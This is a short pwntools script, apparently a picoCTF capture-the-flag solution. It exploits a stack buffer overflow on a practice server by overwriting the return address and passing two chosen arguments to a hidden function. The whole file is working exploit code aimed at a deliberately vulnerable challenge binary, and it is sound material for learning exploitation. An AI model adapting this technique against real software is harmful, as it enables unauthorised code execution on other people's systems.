from pwn import *

p = remote('saturn.picoctf.net', 50180)

p.recvuntil(b'\n')
offset = b'A' * 112
return_address = 0x8049296
arg1 = 0xCAFEF00D
arg2 = 0xF00DF00D

# format on the stack is: offset + address + fake return address for called function (can be anything) + argument 1 + argument 2
p.sendline(offset + p32(return_address) + p32(0x0) + p32(arg1) + p32(arg2))

p.interactive()


